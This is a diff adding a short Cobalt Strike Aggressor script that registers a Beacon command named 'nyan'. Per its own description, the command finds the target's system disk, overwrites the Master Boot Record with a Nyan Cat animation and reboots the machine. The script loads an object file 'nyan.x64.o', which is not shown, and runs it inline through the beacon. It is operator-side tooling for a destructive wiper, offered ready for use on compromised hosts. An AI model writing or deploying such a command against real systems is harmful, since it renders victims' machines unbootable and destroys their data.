@@ -1,0 +1,15 @@
+beacon_command_register(
+    "nyan",
+    "Automatically determines the target's system disk, overwrites the MBR with a Nyan Cat animation, and reboots the machine.",
+    "Synopsis: nyan"
+);
+
+alias nyan {
+    local('$handle $data')
+    $handle = openf(script_resource("nyan.x64.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    btask($1, "NyanCat MBR Overwrite (github.com/arrxnov, Erik Bosman (github.com/brainsmoke))");
+    beacon_inline_execute($1, $data, "go");
+}
